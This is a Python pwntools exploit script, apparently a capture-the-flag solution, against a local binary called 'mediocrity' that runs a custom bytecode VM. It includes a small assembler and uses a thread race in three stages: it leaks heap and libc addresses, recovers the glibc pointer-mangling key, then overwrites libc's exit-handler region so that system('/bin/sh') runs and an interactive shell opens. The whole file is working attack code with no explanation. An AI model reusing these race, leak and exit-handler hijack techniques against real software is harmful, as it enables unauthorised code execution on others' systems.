#!/usr/bin/env python2
import re
from pwn import *
p = process("./mediocrity")
# context.log_level = "debug"
context.terminal = ["tmux", "split", "-h"]

DUMMY = 0xdeadbeef
OP_THREAD = 14
OP_SYSCALL = 15

OP_MOV = 9
REG_CONST = 1
MEM_REG = 3
REG_MEM = 4

OP_MUL = 2

OP_JUMP = 11
OP_JZ = 12

def x(v1, v2, v3=DUMMY, v4=DUMMY):
    payload = p16(v1) + p16(v2) + p64(v3) + p64(v4)
    return payload

is_label = r"(\w+):"
def prob_builder(prog):
    prog = prog.split("\n")
    code = []
    labels = {}
    
    # parse label
    for inst in prog:
        inst = inst.lstrip().rstrip()

        # remove comment
        if "//" in inst:
            inst = inst[:inst.index("//")]

        if inst == '': continue
        
        # label
        m = re.search(is_label, inst)
        if m:
            name = m.group(1)
            if name in labels: 
                error("label dup")
            labels[name] = len(code)
            continue

        code.append(inst)
    
    final = ''
    for inst in code:
        target = [(k, v) for k, v in labels.items() if k in inst]
        for label, pc in target:
            inst = inst.replace(label, str(pc))
        final += eval(inst)

    return final

trial = 0

p.sendline('')
# Step 1: heap & libc leak (from heap)
info("stage 1")
leaker = """
MAIN:
    x(OP_THREAD, 2, RACER, DUMMY)
    x(OP_THREAD, 2, EXIT_THREAD, DUMMY)
    
    // write(1, addr, len)
    x(OP_MOV, REG_CONST, 6, 1) 
    x(OP_MOV, MEM_REG,   0x10, 6) // M[0x10] = 1
    x(OP_MOV, REG_CONST, 1, 0x10) // fd = 1
    
    x(OP_MOV, REG_CONST, 6, 0) 
    x(OP_MOV, MEM_REG,   0x110, 6) // M[0x110] = 0

RETRY:
    x(OP_MOV, REG_CONST, 0, 1)
    x(OP_MOV, REG_CONST, 1, 0x10) // fd = 1
    x(OP_MOV, REG_CONST, 2, 0x100) // addr = 0
    x(OP_MOV, REG_CONST, 3, 0x110) // length = 0 or 0x1500x
    x(OP_SYSCALL, 3) // race

    x(OP_MOV, REG_CONST, 0, 0)
    x(OP_MOV, REG_CONST, 1, 0)
    x(OP_MOV, REG_CONST, 2, 0x40)
    x(OP_MOV, REG_CONST, 3, 8)
    x(OP_SYSCALL, 1) // read(0, mem[0x40], 8) // does exploit successful?
    x(OP_MOV, REG_MEM, 7, 0x40)
    x(OP_MUL, 1      , 7, 1)
    x(OP_JZ, 2, RETRY)
    
    x(OP_MUL, 1,    1337, 0) // exit


RACER: // TODO:
    x(OP_MOV, REG_CONST, 6, 0x1500) 
    x(OP_MOV, REG_CONST, 7, 0)     
LOOP:
    x(OP_MOV, MEM_REG,   0x110, 7) // M[0x110] = 0
    x(OP_MOV, MEM_REG,   0x110, 6) // M[0x110] = 0x1500
    x(OP_JUMP, 2,   LOOP)

EXIT_THREAD:
    x(OP_MUL, 1,    1337, 0) // exit
"""

leaker = prob_builder(leaker)
p.sendlineafter(">> ", "1")
p.sendlineafter("volume : ", str(len(leaker)))
p.send(leaker)

while True:
    data = p.recvn(0x1500, timeout=2)
    if len(data) != 0x1500:
        info("retry")
        p.send(p64(0))
        continue
    
    heap = u64(data[0x610:0x618]) - 0x12c00
    libc = u64(data[0x1000:0x1008]) + 0x8ec9e0
    print("heap base", hex(heap))
    print("libc base", hex(libc))
    p.send(p64(1))
    success("LEAK v")
    break


# Step 2: libc region leak
# addr_mem = heap + 0x12140 + 0x10
info("stage 2")
addr_mem = heap + 0x13150 + 0x10
addr_libc_initial = libc + 0x21af00
print("mem 0x610", hex(addr_mem))
print("&initial", hex(addr_libc_initial))
leaker2 = """
MAIN:
    x(OP_THREAD, 2, RACER, DUMMY)
    
    // write(1, addr, len)
    x(OP_MOV, REG_CONST, 6, 1) 
    x(OP_MOV, MEM_REG,   0x10, 6) // M[0x10] = 1
    x(OP_MOV, REG_CONST, 1, 0x10) // fd = 1
    
    x(OP_MOV, REG_CONST, 6, 40) 
    x(OP_MOV, MEM_REG,   0x110, 6) // M[0x110] = 40

RETRY:
    x(OP_MOV, REG_CONST, 0, 1)
    x(OP_MOV, REG_CONST, 1, 0x10) // fd = 1
    x(OP_MOV, REG_CONST, 2, 0x100) // addr = 0 or distance
    x(OP_MOV, REG_CONST, 3, 0x110) // length = 40
    x(OP_SYSCALL, 3) // race

    x(OP_MOV, REG_CONST, 0, 0)
    x(OP_MOV, REG_CONST, 1, 0)
    x(OP_MOV, REG_CONST, 2, 0x40)
    x(OP_MOV, REG_CONST, 3, 8)
    x(OP_SYSCALL, 1) // read(0, mem[0x40], 8) // does exploit successful?
    x(OP_MOV, REG_MEM, 7, 0x40)
    x(OP_MUL, 1      , 7, 1)
    x(OP_JZ, 2, RETRY)
    
    x(OP_MUL, 1,    1337, 0) // exit

RACER: // TODO:
    x(OP_MOV, REG_CONST, 6, 0) 
    x(OP_MOV, REG_CONST, 7, {})     
LOOP:
    x(OP_MOV, MEM_REG,   0x100, 7) // M[0x100] = distance
    x(OP_MOV, MEM_REG,   0x100, 6) // M[0x100] = 0
    x(OP_JUMP, 2,   LOOP)
""".format(addr_libc_initial - addr_mem)

leaker2 = prob_builder(leaker2)
p.sendlineafter(">> ", "1")
p.sendlineafter("volume : ", str(len(leaker2)))
p.send(leaker2)
origin_fptr = libc + 0x2f40b0
while True:
    data = p.recvn(40, timeout=2)
    if len(data) != 40:
        info("retry")
        p.send(p64(0))
        continue
    
    if u64(data[8:16]) != 0xC:
        info("wrong leak")
        p.send(p64(0))
        continue
    
    mangled = u64(data[0x18:0x20]) 
    key = ror(mangled, 17, 64) ^ origin_fptr
    print("fs:0x30", hex(key))
    success("fs leak v")
    p.send(p64(1))
    break


# Step 3: overwrite &initial region
info("stage 3")
addr_mem = heap + 0x14140 + 0xd0 + 0x10
addr_libc_initial = libc + 0x21af00
print("mem 0x610", hex(addr_mem))
print("&initial", hex(addr_libc_initial))
addr_system = libc + 0x000000000050d60
addr_binsh = libc + 0x1d8698
print("system", hex(addr_system))
print("binsh", hex(addr_binsh))
exploit = """
MAIN:
    x(OP_THREAD, 2, RACER, DUMMY)
    
    // read(1, addr, len)
    x(OP_MOV, REG_CONST, 6, 0) 
    x(OP_MOV, MEM_REG,   0x10, 6) // M[0x10] = 0
    x(OP_MOV, REG_CONST, 6, 1) 
    x(OP_MOV, MEM_REG,   0x18, 6) // M[0x18] = 1
    
    x(OP_MOV, REG_CONST, 6, 0x4141414142424242) 
    x(OP_MOV, MEM_REG,   0x500, 6) // M[0x500] = 0x4141414142424242
    x(OP_MOV, REG_CONST, 6, 0x4141414143434343) 
    x(OP_MOV, MEM_REG,   0x510, 6) // M[0x500] = 0x4141414143434343
    
    x(OP_MOV, REG_CONST, 6, 40) 
    x(OP_MOV, MEM_REG,   0x110, 6) // M[0x110] = 40

RETRY:
    x(OP_MOV, REG_CONST, 0, 1)
    x(OP_MOV, REG_CONST, 1, 1)
    x(OP_MOV, REG_CONST, 2, 0x500)
    x(OP_MOV, REG_CONST, 3, 8)
    x(OP_SYSCALL, 1) // write(1, mem[0x500], 8) // start

    x(OP_MOV, REG_CONST, 0, 0)
    x(OP_MOV, REG_CONST, 1, 0x10) // fd = 0
    x(OP_MOV, REG_CONST, 2, 0x100) // addr = 0x580 or distance
    x(OP_MOV, REG_CONST, 3, 0x110) // length = 40
    x(OP_SYSCALL, 3) // race
    
    x(OP_MOV, REG_CONST, 0, 1)
    x(OP_MOV, REG_CONST, 1, 1)
    x(OP_MOV, REG_CONST, 2, 0x510)
    x(OP_MOV, REG_CONST, 3, 8)
    x(OP_SYSCALL, 1) // write(1, mem[0x510], 8) // end
    
    x(OP_MOV, REG_CONST, 0, 1)
    x(OP_MOV, REG_CONST, 1, 0x18) // fd = 1
    x(OP_MOV, REG_CONST, 2, 0x100) // addr = 0 or distance
    x(OP_MOV, REG_CONST, 3, 0x110) // length = 40
    x(OP_SYSCALL, 3) // check overwritten initial region

    x(OP_MOV, REG_CONST, 0, 0)
    x(OP_MOV, REG_CONST, 1, 0)
    x(OP_MOV, REG_CONST, 2, 0x40)
    x(OP_MOV, REG_CONST, 3, 8)
    x(OP_SYSCALL, 1) // read(0, mem[0x40], 8) // does exploit successful?
    x(OP_MOV, REG_MEM, 7, 0x40)
    x(OP_MUL, 1      , 7, 1)
    x(OP_JZ, 2, RETRY)
    
    x(OP_MOV, REG_CONST, 0, 2)
    x(OP_MOV, REG_CONST, 1, 1337)
    x(OP_SYSCALL, 2)

RACER: // TODO:
    x(OP_MOV, REG_CONST, 6, 0x580) 
    x(OP_MOV, REG_CONST, 7, {})     
LOOP:
    x(OP_MOV, MEM_REG,   0x100, 7) // M[0x100] = distance
    x(OP_MOV, MEM_REG,   0x100, 6) // M[0x100] = 0x580
    x(OP_MOV, MEM_REG,   0x100, 7) // M[0x100] = distance
    x(OP_MOV, MEM_REG,   0x100, 6) // M[0x100] = 0x580
    x(OP_MOV, MEM_REG,   0x100, 7) // M[0x100] = distance
    x(OP_MOV, MEM_REG,   0x100, 6) // M[0x100] = 0x580
    x(OP_MOV, MEM_REG,   0x100, 7) // M[0x100] = distance
    x(OP_MOV, MEM_REG,   0x100, 6) // M[0x100] = 0x580
    x(OP_MOV, MEM_REG,   0x100, 7) // M[0x100] = distance
    x(OP_MOV, MEM_REG,   0x100, 6) // M[0x100] = 0x580
    x(OP_JUMP, 2,   LOOP)
""".format(addr_libc_initial - addr_mem)

exploit = prob_builder(exploit)
p.sendlineafter(">> ", "1")
p.sendlineafter("volume : ", str(len(exploit)))

# gdb.attach(p,"""
# pb 0x000000000003FCF
# pb 0x000000000004059
# pb 0x000000000003EE5
# pb 0x000000000003FCF
# """)

# gdb.attach(p,"""
# pb 0x000000000000409A
# c
# """)

p.send(exploit)
while True:
    assert(p.recv(8) == p64(0x4141414142424242))

    data = p.recv(8, timeout=2)
    if len(data) != 8:
        p.send(''.join([
            p64(0), p64(0x1), p64(4),
            p64(rol(key ^ addr_system, 17, 64)), # mangled system
            p64(addr_binsh),
        ]))
        data = p.recv(8)
        
    assert(data == p64(0x4141414143434343))
    data = p.recvn(40, timeout=3)
    if len(data) != 40:
        info("retry")
        p.send(p64(0))
        continue
    
    print hexdump(data)
    if u64(data[0x8:0x10]) != 1:
        info("failed to overwrite")
        p.send(p64(0))
        continue
    p.send(p64(1))
    break

p.interactive()
